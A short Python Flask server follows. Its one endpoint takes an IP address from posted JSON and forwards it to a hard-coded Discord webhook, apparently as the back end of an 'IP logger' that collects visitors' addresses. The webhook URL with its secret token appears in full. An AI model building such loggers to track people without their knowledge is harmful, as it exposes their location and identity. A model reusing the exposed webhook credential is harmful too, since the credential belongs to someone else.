from flask import Flask, request
import requests

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1287448411985154088/X1Wnq7QgNeXPmTcsiRYr2wHtdlAmoj9dMcdjSW_h346V9v3jP-dq12vzW9uWJ6vJkMbp'

@app.route('/log_ip', methods=['POST'])
def log_ip():
    data = request.json
    ip = data.get('ip')
    if ip:
        payload = {
            'content': f'IP Address: {ip}'
        }
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
        return 'IP logged', 200
    return 'No IP found', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
